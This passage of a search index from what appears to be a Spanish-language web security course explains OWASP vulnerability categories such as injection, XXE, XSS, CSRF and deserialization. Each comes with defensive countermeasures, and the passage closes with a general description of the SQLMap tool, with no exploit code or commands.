restricciones de acceso adecuadas, lo que permite a los usuarios no autorizados acceder a recursos protegidos o realizar acciones que no deber\u00edan poder realizar.</li> <li>Cryptographic Failures (Fallos criptogr\u00e1ficos): Esta categor\u00eda aborda los errores en la implementaci\u00f3n de la criptograf\u00eda, incluidos el uso de algoritmos d\u00e9biles o inseguros, el almacenamiento inadecuado de claves criptogr\u00e1ficas y la falta de protecci\u00f3n adecuada para datos sensibles. Los fallos criptogr\u00e1ficos pueden conducir a la exposici\u00f3n de datos confidenciales, como contrase\u00f1as o informaci\u00f3n financiera, y comprometer la integridad y la autenticidad de los datos transmitidos o almacenados.</li> <li>Injection (Inyecciones): Las vulnerabilidades de inyecci\u00f3n ocurren cuando datos no confiables se incorporan directamente en comandos o consultas de manera insegura. Esto puede conducir a la ejecuci\u00f3n de comandos no deseados o al acceso no autorizado a la base de datos. Ejemplos comunes incluyen SQL injection, LDAP injection y XPath injection.</li> <li>Insecure Design (Dise\u00f1o inseguro): Esta categor\u00eda se refiere a errores en el dise\u00f1o arquitect\u00f3nico de una aplicaci\u00f3n que pueden resultar en vulnerabilidades de seguridad. Estos errores pueden incluir la falta de controles de seguridad adecuados, la mala gesti\u00f3n de privilegios, la exposici\u00f3n innecesaria de funcionalidades sensibles o la falta de separaci\u00f3n adecuada entre componentes de la aplicaci\u00f3n.</li> <li>Security Misconfiguration (Configuraci\u00f3n de seguridad incorrecta): Ocurre cuando una aplicaci\u00f3n o servidor est\u00e1 configurado de manera incorrecta, dejando expuestos datos sensibles o funcionalidades cr\u00edticas. Esto puede incluir permisos de archivo inseguros, configuraciones predeterminadas no seguras o servicios innecesarios habilitados.</li> <li>Vulnerable and Outdated Components (Componentes obsoletos y vulnerables): Esta categor\u00eda se refiere al uso de bibliotecas, frameworks o componentes de terceros en una aplicaci\u00f3n web que contienen vulnerabilidades conocidas o que no han sido actualizados con regularidad. Estos componentes pueden ser una fuente significativa de riesgo de seguridad si no se aplican parches o actualizaciones de seguridad para abordar las vulnerabilidades conocidas.</li> </ul>"},{"location":"teoria/vulnerabilidades-web/#vulnerabilidades-de-inyeccion","title":"VULNERABILIDADES DE INYECCION","text":"<p>Siempre que haya entrada de texto, entrada de usuario, campo de contrase\u00f1a, de comentarios, etc existe el riesgo que se produzca un ataque por inyecci\u00f3n, en particular la inyecci\u00f3n SQL son habituales en las aplicaciones web, esta se produce cuando los datos suministrados por el usuario se env\u00edan a un int\u00e9rprete (lado del servidor) como parte de un comando o consulta.</p> <p>Los datos hostiles del atacante enga\u00f1an al interprete para que ejecute comandos no deseados o cambie datos, de esta forma puede controlar la base de datos desde la aplicaci\u00f3n. Esto se produce cuando una aplicaci\u00f3n web solicita al usuario una entrada.</p> <p>\u00bfQu\u00e9 se inyecta?</p> <ul> <li>Consultas SQL</li> <li>Consultas PHP</li> <li>Consultas LDAP</li> <li>Consultas OS (Uso de llamadas al sistema para realizar a su vez llamadas al sistema operativo)</li> </ul> <p>Cualquier aplicaci\u00f3n Web que dependa del uso de un int\u00e9rprete tiene el potencial de ser v\u00edctima de este tipo de fallo.</p> <p>EJEMPLO (B\u00fasqueda por ID) </p> <p></p> <p>\u00bfCOMO PROTEGERSE?</p> <ul> <li>Realizar revisiones del dise\u00f1o y del c\u00f3digo de las bibliotecas reutilizables para garantizar la seguridad</li> <li>Validaci\u00f3n de entradas y datos</li> <li>Uso de APIs seguras y consultas parametrizadas</li> <li>Ejecutar comandos con privilegios m\u00ednimos</li> </ul>  [PRACTICA INYECCION SQL](../laboratorio/vulnerar-sitioweb.md)"},{"location":"teoria/vulnerabilidades-web/#vulnerabilidades-en-la-exposicion-de-datos-sensibles","title":"VULNERABILIDADES EN LA EXPOSICION DE DATOS SENSIBLES","text":"<p>Las aplicaciones pueden filtrar involuntariamente informaci\u00f3n sobre su configuraci\u00f3n, funcionamiento interno, o violar la privacidad a trav\u00e9s de una variedad de problemas de aplicaci\u00f3n para luego los atacantes utilizar esta debilidad para robar datos sensibles o llevar a cabo ataques m\u00e1s graves.</p> <p>Los algoritmos criptogr\u00e1ficos d\u00e9biles son susceptibles de ataques y revelan datos sensibles.  </p> <p>\u00bfCOMO PROTEGERSE?</p> <ul> <li>Evitar la visualizaci\u00f3n de mensajes de error internos detallados, incluyendo trazas de pila, mensajes con nombres de bases de datos o tablas, protocolos y otros c\u00f3digos de error. (Esto puede proporcionar a los atacantes pistas sobre posibles fallos)</li> <li>Proporcionar mensajes de error breves al usuario mientras se registra informaci\u00f3n detallada de errores en un archivo de registro interno.</li> <li>Cifrar todos los datos en tr\u00e1nsito y en reposo.</li> <li>Utilice protocolos y algoritmos seguros.</li> <li>Desactivar el almacenamiento en cache de respuestas con datos sensibles.</li> </ul>"},{"location":"teoria/vulnerabilidades-web/#vulnerabilidades-de-las-entidades-externas-xml-xxe","title":"VULNERABILIDADES DE LAS ENTIDADES EXTERNAS XML (XXE)","text":"<p>Una aplicaci\u00f3n es vulnerable a ataques XXE si permite a los usuarios cargar un XML malicioso que explote el c\u00f3digo vulnerable.</p> <p>Esto se puede utilizar para ejecutar c\u00f3digo, robar datos y realizar otras tareas maliciosas.</p> <p>Un ataque de XML External Entity (XXE) es una vulnerabilidad de seguridad que afecta a aplicaciones web que procesan datos XML. En un ataque XXE, un atacante aprovecha la capacidad de una aplicaci\u00f3n para procesar entradas XML externas no confiables y maliciosas que pueden conducir a una variedad de problemas de seguridad, incluida la revelaci\u00f3n de informaci\u00f3n confidencial, la ejecuci\u00f3n remota de c\u00f3digo y la denegaci\u00f3n de servicio (DoS).</p> <p>Los datos XML (Extensible Markup Language) son un formato de datos que se utiliza para estructurar y organizar la informaci\u00f3n de manera jer\u00e1rquica mediante etiquetas que describen el contenido de los datos. XML es un lenguaje de marcado similar a HTML, pero est\u00e1 dise\u00f1ado para ser m\u00e1s flexible y extensible.</p> <p>En XML, los datos se organizan en elementos, que est\u00e1n delimitados por etiquetas de apertura y cierre. Cada elemento puede contener texto, otros elementos o atributos que describen caracter\u00edsticas espec\u00edficas del elemento. Por ejemplo: </p> <p>En este ejemplo, &lt;libro&gt;, &lt;titulo&gt;, &lt;autor&gt; y &lt;publicaci\u00f3n&gt; son elementos, y el texto dentro de las etiquetas representa los datos asociados a cada elemento.</p> <p>XML se utiliza ampliamente para intercambiar datos entre sistemas y aplicaciones, ya que es legible tanto por humanos como por m\u00e1quinas, y su estructura flexible permite definir formatos de datos personalizados para una amplia variedad de casos de uso.</p> <p>\u00bfCOMO PROTEGERSE?</p> <ul> <li>Evitar la serializaci\u00f3n de datos sensibles</li> <li>Implementar un enfoque de listas blancas en el lado del servidor para evitar la carga de XML maliciosos</li> <li>Uso de WAF para detectar y bloquear XXE</li> <li>Revisi\u00f3n de c\u00f3digo</li> </ul>"},{"location":"teoria/vulnerabilidades-web/#vulnerabilidades-en-el-control-de-acceso","title":"VULNERABILIDADES EN EL CONTROL DE ACCESO","text":"<p>Se refieren a cualquier intento de un individuo o un sistema de obtener acceso no autorizado a recursos o datos protegidos. Esto puede incluir intentos de acceso a sistemas inform\u00e1ticos, redes, bases de datos, aplicaciones web u otros recursos que contienen informaci\u00f3n confidencial o sensible.</p> <p>\u00bfCOMO PROTEGERSE?</p> <ul> <li>Autenticaci\u00f3n s\u00f3lida: Utilizar m\u00e9todos robustos de autenticaci\u00f3n, como contrase\u00f1as seguras y autenticaci\u00f3n multifactor (MFA).</li> <li>Autorizaci\u00f3n adecuada: Establecer pol\u00edticas claras de autorizaci\u00f3n para determinar qui\u00e9n tiene acceso a qu\u00e9 recursos y en qu\u00e9 capacidades.</li> <li>Principio de privilegio m\u00ednimo: Otorgar a los usuarios solo los privilegios m\u00ednimos necesarios para realizar sus funciones, reduciendo as\u00ed el riesgo de acceso no autorizado a datos sensibles.</li> <li>Monitoreo y registro: Implementar sistemas de monitoreo y registro para detectar y responder r\u00e1pidamente a actividades sospechosas o no autorizadas.</li> <li>Invalidar tokens y cookies tras el cierre de sesi\u00f3n.</li> </ul>"},{"location":"teoria/vulnerabilidades-web/#vulnerabilidades-en-la-configuracion-de-seguridad","title":"VULNERABILIDADES EN LA CONFIGURACION DE SEGURIDAD","text":"<p>Las vulnerabilidades en la configuraci\u00f3n de seguridad pueden surgir cuando no se siguen los requisitos de seguridad en los servidores, lo que puede exponerlos a riesgos y amenazas cibern\u00e9ticas.</p> <p>Esto puede suceder cuando los administradores de sistemas no aplican las mejores pr\u00e1cticas de seguridad, como configurar adecuadamente los cortafuegos, mantener actualizados los sistemas y aplicaciones con los \u00faltimos parches de seguridad, y asegurarse de que se utilicen contrase\u00f1as fuertes y se implemente la autenticaci\u00f3n multifactor (MFA) cuando sea posible.</p> <p>Se considera una mala configuraci\u00f3n de seguridad cuando:</p> <ul> <li>No se siguen los requisitos de seguridad en los servidores</li> <li>No se aplican las mejores practicas</li> <li>Favorecer la practicidad sobre la seguridad </li> </ul> <p>\u00bfCOMO PROTEGERSE?</p> <ul> <li>Siga un proceso de refuerzo tanto para el hardware como para las aplicaciones</li> <li>Aseg\u00farese de que se modifiquen los valores por defecto</li> <li>Instale solo las funciones necesarias de un marco de trabajo</li> <li>Revise la seguridad de las configuraciones a intervalos fijos</li> </ul>"},{"location":"teoria/vulnerabilidades-web/#vulnerabilidades-de-cross-site-scripting-xss","title":"VULNERABILIDADES DE CROSS SITE SCRIPTING (XSS)","text":"<p>XSS, o Cross-Site Scripting, permite a los atacantes inyectar scripts del lado del cliente en p\u00e1ginas web leg\u00edtimas vulnerables vistas por otros usuarios. Este tipo de ataque puede ser utilizado para robar cookies de sesi\u00f3n, realizar phishing, redirigir a usuarios a sitios maliciosos o incluso defacing de sitios web. El objetivo del ataque conf\u00eda en la aplicaci\u00f3n web y, por lo tanto, los ataques XSS explotan esa confianza para ejecutar acciones maliciosas que normalmente no estar\u00edan permitidas.</p> <p>Es fundamental para los desarrolladores implementar medidas de seguridad, como la validaci\u00f3n y el escape de datos de entrada, para mitigar el riesgo de ataques XSS y proteger la integridad y la confidencialidad de los datos del usuario.</p>"},{"location":"teoria/vulnerabilidades-web/#categorias-de-ataques-xss","title":"CATEGORIAS DE ATAQUES XSS","text":"<ul> <li> <p>Reflejados (no persistentes)</p> <ul> <li>Los ataques reflejados llegan a la v\u00edctima por otra v\u00eda (a trav\u00e9s de un mensaje de correo electr\u00f3nico o rebotados desde otro servidor)</li> <li>El ataque suele adoptar la forma de una etiqueta HTML (a menudo el hiperv\u00ednculo) que contiene secuencias de comandos maliciosas (a menudo JavaScript)</li> <li>Suele realizarse cuando existe una ubicaci\u00f3n en la que se puede introducir contenido arbitrario (como un mensaje de correo electr\u00f3nico o un campo de texto libre, por ejemplo) y a continuaci\u00f3n, el objetivo del ataque hace referencia a \u00e9l.   </li> </ul> </li> <li> <p>Almacenado(persistente)</p> <ul> <li>El c\u00f3digo inyectado se almacena de forma permanente en la aplicaci\u00f3n web, como en una base de datos, un foro de mensajes, un registro de comentarios o un perfil de usuario.</li> <li>Cuando un usuario accede a la p\u00e1gina comprometida, el script malicioso se ejecuta autom\u00e1ticamente, lo que puede tener consecuencias graves, como robo de sesiones, modificaci\u00f3n de contenido o redirecci\u00f3n a sitios maliciosos.</li> <li>Este tipo de ataque puede ser m\u00e1s peligroso que los ataques reflejados, ya que el c\u00f3digo malicioso permanece activo y puede afectar a m\u00faltiples usuarios durante un per\u00edodo prolongado de tiempo.   </li> </ul> </li> </ul> <p>\u00bfCOMO PROTEGERSE?</p> <ul> <li>Se recomienda filtrar/sanitizar la entrada de datos en la medida de lo posible (es posible que algunos datos deban permitir caracteres especiales)</li> <li>Filtrar la salida convirtiendo el texto o los datos que puedan contener caracteres HTML peligrosos a su formato codificado:<ul> <li>\" a \"</li> <li>&lt; a &lt;</li> <li>&gt; a &gt;</li> </ul> </li> <li>Utilizar marcos de trabajo en lugar de codificar desde cero. Existen marcos de trabajo como OWASP AntiSamy que pueden ayudar a proteger contra XSS.</li> <li>Implementar una Pol\u00edtica de seguridad de contenidos (CSP). Una CSP puede ayudar a prevenir ataques XSS al especificar qu\u00e9 scripts se pueden ejecutar en una p\u00e1gina web.</li> </ul>"},{"location":"teoria/vulnerabilidades-web/#vulnerabilidades-de-deserializacion-inseguras","title":"VULNERABILIDADES DE DESERIALIZACION INSEGURAS","text":"<p>Algunas de las aplicaciones guardan datos del lado del cliente utilizando objetos serializados, estas aplicaciones conf\u00edan en el cliente para mantener el estado, pero permitir\u00e1n la manipulaci\u00f3n de datos serializados, ejemplo:</p> <p>Alteraci\u00f3n de los objetos serializados en las cookies para escalada de privilegios </p> <p>\u00bfCOMO PROTEGERSE?</p> <ul> <li>Cifrado de los datos serializados</li> </ul>"},{"location":"teoria/vulnerabilidades-web/#uso-de-componentes-con-vulnerabilidades-conocidas","title":"USO DE COMPONENTES CON VULNERABILIDADES CONOCIDAS","text":"<p>Si la aplicaci\u00f3n utiliza alg\u00fan componente con vulnerabilidades conocidas esto puede conducir a problemas de seguridad, violaciones de seguridad e incluso la toma del control del servidor, estos componentes pueden ser Marcos, bibliotecas y funciones vulnerables.</p> <p>EJEMPLOS DE USO DE COMPONENTES CON VULNERABILIDADES CONOCIDAS</p> <ul> <li>Uso de una versi\u00f3n vulnerable de PHP</li> <li>Versi\u00f3n de kernel obsoleta</li> <li>Servidor Windows sin parches</li> <li>Versi\u00f3n de Query vulnerable</li> </ul> <p>\u00bfCOMO PROTEGERSE?</p> <ul> <li>Establecer y seguir un proceso regular de aplicaci\u00f3n de parches</li> <li>Suscribirse a foros de seguridad relevantes (CVE/Fixes) para mantenerse actualizado</li> </ul>"},{"location":"teoria/vulnerabilidades-web/#vulnerabilidades-de-registro-y-monitorizacion-insuficientes","title":"VULNERABILIDADES DE REGISTRO Y MONITORIZACION INSUFICIENTES","text":"<p>Con todas las contramedidas existentes los ataques aun as\u00ed pueden acceder y esto solo se nota despu\u00e9s de que ha ocurrido un incidente. Se dice que en promedio la mayor\u00eda de los ataques tardan 200 d\u00edas en descubrirse y si no se detecta el atacante podr\u00eda haber comprometido el sistema hace mucho tiempo, para asegurarse de que se note la intenci\u00f3n maliciosa del atacante es esencial registrar y monitorear todas las actividades.</p> <p>Es esencial registrar toda la actividad y monitorearla en b\u00fasqueda de cualquier comportamiento sospechoso.</p> <p>ALGUNOS EJEMPLOS:</p> <ul> <li>Demasiados intentos de inicio de sesi\u00f3n fallidos desde una fuente en particular</li> <li>Demasiadas peticiones desde una fuente en particular a un ritmo extremadamente r\u00e1pido/lento/fijo podr\u00eda ser un intento de DOS. Compruebe y act\u00fae</li> <li>Trafico basura</li> <li>Picos en el patr\u00f3n de tr\u00e1fico cuando no se esperan</li> <li>Consultas DNS extensas</li> </ul> <p>\u00bfCOMO PROTEGERSE?</p> <ul> <li>Supervisi\u00f3n 24/7 del tr\u00e1fico de aplicaciones y an\u00e1lisis de registros</li> <li>Implantaci\u00f3n y puesta en pr\u00e1ctica de procedimientos eficaces de respuesta a incidentes de seguridad.</li> </ul>"},{"location":"teoria/vulnerabilidades-web/#riesgos-adicionales-a-tener-en-cuenta","title":"RIESGOS ADICIONALES A TENER EN CUENTA","text":"<ul> <li>Falsificaci\u00f3n de petici\u00f3n en sitios cruzados</li> </ul> <p>CSRF es una vulnerabilidad que permite a un atacante inducir a un usuario a realizar acciones no deseadas en una aplicaci\u00f3n web en la que el usuario est\u00e1 autenticado. El atacante puede crear una solicitud HTTP maliciosa y enga\u00f1ar al usuario para que la ejecute, aprovechando la sesi\u00f3n activa del usuario en la aplicaci\u00f3n. Esto puede llevar a acciones no autorizadas, como cambiar la contrase\u00f1a, realizar transacciones financieras o eliminar datos.</p> <ul> <li>Carga ilimitada de archivos de tipo peligroso</li> </ul> <p>Esta vulnerabilidad se produce cuando una aplicaci\u00f3n web permite la carga de archivos sin restricciones adecuadas, lo que puede resultar en la carga de archivos maliciosos, como scripts, ejecutables o archivos infectados con malware. Esto puede ser explotado por un atacante para ejecutar c\u00f3digo malicioso en el servidor o comprometer la seguridad de otros usuarios.</p> <ul> <li>Secuestro de clics</li> </ul> <p>El secuestro de clics, tambi\u00e9n conocido como \"Clickjacking\", es una t\u00e9cnica utilizada por los atacantes para enga\u00f1ar a los usuarios y hacer que hagan clic en elementos de una p\u00e1gina web sin su conocimiento o consentimiento. Esto se logra superponiendo elementos transparentes o invisibles sobre elementos leg\u00edtimos de la p\u00e1gina web, de modo que cuando un usuario hace clic en lo que parece ser un elemento leg\u00edtimo, en realidad est\u00e1 haciendo clic en otro elemento oculto. Esta t\u00e9cnica puede ser utilizada para dirigir a los usuarios a sitios maliciosos, realizar acciones no deseadas o robar informaci\u00f3n confidencial.</p>"},{"location":"teoria/vulnerabilidades-web/#descubrir-vulnerabilidades-en-sitios-web","title":"DESCUBRIR VULNERABILIDADES EN SITIOS WEB","text":"<p>Antes de realizar cualquier prueba de penetraci\u00f3n en un sitio web, es sabio comenzar con un escaneo exhaustivo del mismo para descubrir posibles vulnerabilidades y puntos d\u00e9biles en la seguridad. Esto puede incluir el uso de herramientas automatizadas de escaneo de vulnerabilidades, como esc\u00e1neres de seguridad web, que pueden identificar vulnerabilidades comunes, como inyecciones SQL, XSS, CSRF, archivos y directorios expuestos, entre otros.</p> <p>Adem\u00e1s, es importante realizar una evaluaci\u00f3n manual de la seguridad del sitio web, revisando el c\u00f3digo fuente, las configuraciones del servidor, los archivos de configuraci\u00f3n y otras \u00e1reas que puedan ser susceptibles a ataques. Esto puede ayudar a identificar vulnerabilidades espec\u00edficas y personalizadas que pueden no ser detectadas por herramientas automatizadas.</p>"},{"location":"teoria/vulnerabilidades-web/#control-del-servidor-de-bases-de-datos-con-sqlmap","title":"CONTROL DEL SERVIDOR DE BASES DE DATOS CON SQLMAP","text":"<p>SQLMap es una herramienta poderosa que automatiza el proceso de detectar y explotar flujos de inyecci\u00f3n SQL en sitios web. Su objetivo principal es permitir a los usuarios tomar el control del servidor de la base de datos subyacente.</p> <p>Una de las caracter\u00edsticas destacadas de SQLMap es su motor de detecci\u00f3n altamente eficaz, que puede identificar vulnerabilidades de inyecci\u00f3n SQL de manera r\u00e1pida y precisa. Esto les permite a los usuarios realizar pruebas exhaustivas en sitios web en busca de posibles vulnerabilidades de seguridad.</p> <p>Adem\u00e1s de su motor de detecci\u00f3n avanzado, SQLMap cuenta con una amplia gama de interruptores y opciones que brindan flexibilidad y control a los usuarios durante el proceso de an\u00e1lisis y explotaci\u00f3n. Estos interruptores permiten ajustar el comportamiento de la herramienta seg\u00fan las necesidades espec\u00edficas del usuario y las caracter\u00edsticas del sitio web objetivo.</p>"}]}